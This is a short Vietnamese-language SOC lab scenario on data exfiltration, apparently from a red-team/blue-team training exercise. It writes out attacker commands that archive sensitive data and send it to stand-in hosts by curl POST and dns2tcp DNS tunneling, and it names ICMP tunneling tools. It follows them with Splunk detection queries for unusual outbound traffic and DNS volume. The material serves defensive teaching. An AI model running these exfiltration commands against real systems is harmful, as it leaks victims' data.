# Kịch bản 6: Data Exfiltration

**Mục tiêu:** Attacker đánh cắp dữ liệu nhạy cảm ra ngoài.

**Thực hiện trên VM-ATTACKER:**

```bash
# Nén dữ liệu và gửi qua HTTP/DNS
tar -czf stolen_data.tar.gz /path/to/sensitive/data

# Gửi qua HTTP
curl -X POST -F "file=@stolen_data.tar.gz" http://attacker-server.com/upload

# Gửi qua DNS tunneling (dns2tcp)
dns2tcp -c -z stolen_data.tar.gz -s attacker-domain.com

# Gửi qua ICMP tunneling
# Sử dụng icmpsh hoặc ping tunnel
```

**SOC phát hiện:**

- **Network**: Lượng dữ liệu outbound lớn bất thường
- **DNS**: Nhiều truy vấn DNS subdomain lạ (DNS tunneling)
- **Splunk queries**:
```sql
index=network dest_ip=!192.168.56.*
| stats sum(bytes_out) by src_ip, dest_ip
| where sum > 1000000

index=dns query="*"
| stats count by query
| where count > 100
```

